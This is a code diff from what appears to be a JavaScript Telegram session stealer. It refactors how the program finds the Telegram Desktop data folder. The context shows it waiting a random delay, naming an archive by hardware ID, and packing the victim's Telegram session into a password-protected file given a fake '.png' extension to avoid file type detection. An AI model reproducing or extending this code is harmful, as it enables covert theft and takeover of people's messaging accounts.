@@ -31,7 +31,8 @@ function getAppDataPath() {
   }
 }
 
-async function findTelegramDirectoryPath(appDataPath) {
+async function findTelegramDirectoryPath() {
+  const appDataPath = await getAppDataPath()
   const telegramDirectory = path.join(appDataPath, 'Telegram Desktop')
   if (fs.existsSync(telegramDirectory)) return telegramDirectory
 
@@ -172,8 +173,7 @@ async function run(
   // Wait before execution
   if (waitOnStart) await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 5000 + 3000)))
 
-  const appDataPath = await getAppDataPath()
-  const telegramDirectoryPath = await findTelegramDirectoryPath(appDataPath)
+  const telegramDirectoryPath = await findTelegramDirectoryPath()
   const hwid = await getHwid()
   const archivePath = path.join(tempDirectory, `${hwid}.png`) // Fake extension to prevent file type detection
   await archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassword)
